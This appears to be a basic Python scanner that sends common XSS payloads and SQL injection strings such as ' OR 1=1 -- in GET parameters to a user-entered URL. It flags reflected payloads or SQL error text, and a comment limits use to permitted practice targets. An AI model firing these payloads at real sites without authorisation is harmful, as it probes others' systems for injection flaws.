import requests

def scan_xss(url):
    # Very basic XSS payload check
    payloads = [
        "<script>alert('XSS')</script>",
        "<h1>XSS Test</h1>",
        "<img src=x onerror=alert('XSS')>"
    ]
    print(f"Scanning {url} for XSS...")
    for payload in payloads:
        test_url = f"{url}?param={payload}" # Assuming a GET parameter
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                print(f"  [!] Potential XSS vulnerability found with payload: {payload}")
            else:
                print(f"  [+] No XSS detected with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"  Error checking {test_url}: {e}")

def scan_sqli(url):
    # Very basic SQLi payload check
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "admin'--",
        "admin' OR 'a'='a"
    ]
    print(f"Scanning {url} for SQL Injection...")
    for payload in payloads:
        test_url = f"{url}?id={payload}" # Assuming an ID parameter
        try:
            response = requests.get(test_url, timeout=5)
            # Look for common SQL error messages as a sign of vulnerability
            if "sql syntax" in response.text.lower() or \
               "mysql" in response.text.lower() or \
               "union all select" in response.text.lower():
                print(f"  [!] Potential SQLi vulnerability found with payload: {payload}")
            else:
                print(f"  [+] No SQLi detected with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"  Error checking {test_url}: {e}")

if __name__ == "__main__":
    target_web_app = input("Enter target web application URL (e.g., http://testphp.vulnweb.com): ")

    # Note: Only use this on websites you have explicit permission to test!
    # You can use intentionally vulnerable web applications for practice, e.g., DVWA, OWASP Juice Shop.

    scan_xss(target_web_app)
    print("-" * 30)
    scan_sqli(target_web_app)
  
